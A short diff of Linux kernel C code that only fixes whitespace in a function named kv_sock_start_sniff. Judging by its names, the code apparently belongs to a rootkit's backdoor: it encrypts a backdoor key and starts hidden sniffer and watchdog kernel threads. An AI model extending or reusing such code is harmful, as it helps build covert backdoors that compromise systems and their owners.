@@ -617,7 +617,7 @@ struct task_struct *kv_sock_start_sniff(void)
 	bool *running = _is_task_running();
 	static struct nf_priv priv;
 	struct task_struct *tsk = NULL;
-    u8 buf[16] = {0};
+	u8 buf[16] = { 0 };
 
 	/**
 	 * Init bdkey enc
@@ -627,7 +627,7 @@ struct task_struct *kv_sock_start_sniff(void)
 		prerr("Failed to encrypt bdkey\n");
 		goto leave;
 	}
-	
+
 	/** for the aes-256, 16 bytes
 	* is minimum data size
 	*/
@@ -651,7 +651,7 @@ struct task_struct *kv_sock_start_sniff(void)
 			goto leave;
 
 		tsk_iph = kthread_run(_bd_watchdog_iph, NULL,
-				THREAD_SNIFFER_NAME);
+				      THREAD_SNIFFER_NAME);
 		if (!tsk_iph) {
 			kthread_stop(tsk);
 			goto leave;
